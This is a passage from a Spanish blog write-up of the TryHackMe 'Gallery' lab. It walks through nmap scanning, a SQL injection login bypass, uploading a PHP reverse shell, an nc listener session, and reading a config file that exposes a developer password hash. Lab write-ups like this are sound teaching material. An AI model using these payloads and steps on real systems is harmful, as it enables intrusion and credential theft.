@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.
+Parámetro → Descripción
+-p- → Escanea el rango completo de puertos(65535 puertos). &amp;ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. &amp;ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts.'>
+<title>WriteUp Gallery</title>
+
+<link rel='canonical' href='/p/writeup-gallery/'>
+
+<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='WriteUp Gallery'>
+<meta property='og:description' content='Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.
+Parámetro → Descripción
+-p- → Escanea el rango completo de puertos(65535 puertos). &amp;ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. &amp;ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts.'>
+<meta property='og:url' content='/p/writeup-gallery/'>
+<meta property='og:site_name' content='Liv3P0ol'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-08-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-08-23T00:00:00&#43;00:00'/><meta property='og:image' content='/p/writeup-gallery/logo.png' />
+<meta name="twitter:title" content="WriteUp Gallery">
+<meta name="twitter:description" content="Scanning Empezamos con el reconocimiento de puertos con un TCP SYN Port Scan.
+Parámetro → Descripción
+-p- → Escanea el rango completo de puertos(65535 puertos). &amp;ndash;open → Puertos que esten solo abiertos. -sS → Escaneo de tipo SYN port scan. &amp;ndash;min-rate → Envia paquetes no más lentos que 5000 por segundo. -vvv → Triple verbose para ver en consola los resultados. -n → No efectua resolución DNS. -Pn → No efectua descubrimientos de hosts."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/writeup-gallery/logo.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo1_hu4cd92a203c8104ea58ca026f0632b0b6_33996_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Liv3P0ol</a></h1>
+            <h2 class="site-description">Cybersecurity Analyst</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/liv3p0ol'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://linkedin.com/in/%c3%a1lvaro-gil-banda-323663196'
+                        target="_blank"
+                        title="LinkedIn"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#scanning">Scanning</a></li>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#explotacion">Explotacion</a></li>
+        <li><a href="#escalada">Escalada</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/writeup-gallery/">
+                <img src="/p/writeup-gallery/logo_hua0b92525cbc2653ca50d40ec787593a2_15704_800x0_resize_box_3.png"
+                        srcset="/p/writeup-gallery/logo_hua0b92525cbc2653ca50d40ec787593a2_15704_800x0_resize_box_3.png 800w, /p/writeup-gallery/logo_hua0b92525cbc2653ca50d40ec787593a2_15704_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="293" 
+                        loading="lazy"
+                        alt="Featured image of post WriteUp Gallery" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/tryhackme/" style="background-color: #e62929; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/writeup-gallery/">WriteUp Gallery</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 23, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="scanning">Scanning</h3>
+<p>Empezamos con el reconocimiento de puertos con un <code>TCP SYN Port Scan</code>.</p>
+<p><strong>Parámetro</strong> → <strong>Descripción</strong></p>
+<ul>
+<li><strong>-p-</strong> → Escanea el rango completo de puertos(65535 puertos).</li>
+<li><strong>&ndash;open</strong> → Puertos que esten solo abiertos.</li>
+<li><strong>-sS</strong> → Escaneo de tipo SYN port scan.</li>
+<li><strong>&ndash;min-rate</strong> → Envia paquetes no más lentos que 5000 por segundo.</li>
+<li><strong>-vvv</strong> → Triple verbose para ver en consola los resultados.</li>
+<li><strong>-n</strong> → No efectua resolución DNS.</li>
+<li><strong>-Pn</strong> → No efectua descubrimientos de hosts.</li>
+<li><strong>-oG</strong> → Guardar el output en formato grepeable.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.170.103 -oG allports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE        REASON
+</span></span><span class="line"><span class="cl">80/tcp   open  http           syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy     syn-ack ttl <span class="m">63</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez obtenidos los puertos que estan abiertos y visibles hacia nosotros, es ora de obtener mas información de los mismos.</p>
+<p><strong>Parámetro</strong> → <strong>Descripción</strong></p>
+<ul>
+<li><strong>-sC</strong> → Muestra todos los scripts relacionados con el servicio.</li>
+<li><strong>-sV</strong> → Determina la version del servicio.</li>
+<li><strong>-p</strong> → Escanea sobre los peurtos especificados.</li>
+<li><strong>-oN</strong> → Guarda el output en un arcivo con formato normal.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sCV -p80,8080 10.10.170.103 -oN targeted
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Simple Image Gallery System
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enumeration">Enumeration</h3>
+<p>Como podemos ver en el escaneo de <code>nmap</code> hay dos puertos abiertos, los cuales ambos son servicios webs.Si visitamos el primer servicio web veremos que se nos muestra la pagina por defecto de <strong>Apache2</strong>. Sin embargo, si visitamos el segundo servicio corriendo en el puerto 8080, vemos que nos redirije a una pagina de autenticación.</p>
+<p><img src="/p/writeup-gallery/images/1.png"
+	width="1577"
+	height="623"
+	srcset="/p/writeup-gallery/images/1_hue994ca3d6fafb0449462f5104da7c0d8_42126_480x0_resize_box_3.png 480w, /p/writeup-gallery/images/1_hue994ca3d6fafb0449462f5104da7c0d8_42126_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p>Probamos a meter unas credenciales y capturar la respuesta del servidor con <strong>BurpSuite</strong> . Si vemos el error nos damos cuenta que parece ser de SQL, lo cual nos puede hacer sospechar que es vulnerable a <strong>SQLi</strong>.</p>
+<p><img src="/p/writeup-gallery/images/2.PNG"
+	width="1263"
+	height="533"
+	srcset="/p/writeup-gallery/images/2_hu37b326a2d035e5a5d038089d75f66f0b_68201_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/2_hu37b326a2d035e5a5d038089d75f66f0b_68201_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="236"
+		data-flex-basis="568px"
+	
+></p>
+<p>Probamos a hacer un bypass del login con una inyeccion SQL básica para ver si funciona. → <code>admin' or 1=1-- -</code></p>
+<p>Vemos que ha funcionado y hemos accecido como Administrador.</p>
+<p><img src="/p/writeup-gallery/images/3.PNG"
+	width="1125"
+	height="525"
+	srcset="/p/writeup-gallery/images/3_hu729e1f50a7aaf1663e7f12e6d8b41c9d_62307_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/3_hu729e1f50a7aaf1663e7f12e6d8b41c9d_62307_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="514px"
+	
+></p>
+<p><img src="/p/writeup-gallery/images/4.PNG"
+	width="1571"
+	height="623"
+	srcset="/p/writeup-gallery/images/4_huf624ddfae666c370d55761b3859fec81_67785_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/4_huf624ddfae666c370d55761b3859fec81_67785_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="605px"
+	
+></p>
+<h3 id="explotacion">Explotacion</h3>
+<p>Si nos vamos moviendo por los menús de la página vemos que en el sitio de Albums hay una opción de uploads. Probamos a subir una reversell de php, en cual hay que cambiar algunos valores como la <strong>IP</strong> y el <strong>PUERTO</strong> al cual queremos que nos envie la reverse shell.</p>
+<p><a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"  target="_blank" rel="noopener"
+    >https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
+<p><img src="/p/writeup-gallery/images/5.PNG"
+	width="1567"
+	height="629"
+	srcset="/p/writeup-gallery/images/5_hu4957522e30c0e708f199730465aa0124_116634_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/5_hu4957522e30c0e708f199730465aa0124_116634_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="597px"
+	
+></p>
+<p><img src="/p/writeup-gallery/images/6.PNG"
+	width="533"
+	height="269"
+	srcset="/p/writeup-gallery/images/6_hu3e29fc4c20ca910922b50bfdb8177582_14126_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/6_hu3e29fc4c20ca910922b50bfdb8177582_14126_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="475px"
+	
+></p>
+<p>Nos ponemos en escucha con <code>nc</code> en el <strong>PUERTO</strong> e <strong>IP</strong> que hemos puesto en el archivo php que hemos subido a la web y obtendremos una shell.</p>
+<h3 id="escalada">Escalada</h3>
+<p>Recibimos la shell, pero esta shell es muy inestable por lo que vamos a hacer un tratamiento de la <strong>TTY</strong> para no tener futuros problemas con la shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4443</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4443</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.41.113<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.170.103<span class="o">]</span> <span class="m">35558</span>
+</span></span><span class="line"><span class="cl">Linux gallery 4.15.0-167-generic <span class="c1">#175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 18:09:49 up <span class="m">27</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.90, 3.02
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="sb">`</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Tratamiento de la TTY</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span><span class="line"><span class="cl">^Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">reset xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez con el tratemiento de la TTY hecho y la shell mas estable es hora de escalar privlegios a un usuario del sistema, y despues alcanzar a ser root.</p>
+<p>Para obtener la contraseña que se nos pide en uno de los apartados de TryHackMe es necesario buscar la contraseña del admin, en mi caso lo he hecho yendo al archivo <code>initialize.php</code> en el cual hay credenciales para iniciar sesion en la base de datos y así poder extraer dicha contraseña hasheada y crackearla posteriormente.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html/gallery
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/www/html/gallery$ cat initialize.php 
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"><span class="nv">$dev_data</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;-1&#39;</span>,<span class="s1">&#39;firstname&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;Developer&#39;</span>,<span class="s1">&#39;lastname&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;username&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;dev_oretnom&#39;</span>,<span class="s1">&#39;password&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;5da283a2d990e8d8512cf967df5bc0d0&#39;</span>,<span class="s1">&#39;last_login&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;date_updated&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;date_added&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;base_url&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;base_url&#39;</span>,<span class="s2">&#34;http://&#34;</span> . <span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;SERVER_ADDR&#39;</span><span class="o">]</span> . <span class="s2">&#34;/gallery/&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;base_app&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;base_app&#39;</span>, str_replace<span class="o">(</span><span class="s1">&#39;\\&#39;</span>,<span class="s1">&#39;/&#39;</span>,__DIR__<span class="o">)</span>.<span class="s1">&#39;/&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;dev_data&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;dev_data&#39;</span>,<span class="nv">$dev_data</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;DB_SERVER&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;DB_SERVER&#39;</span>,<span class="s2">&#34;localhost&#34;</span><span class="o">)</span><span class="p">;</span>
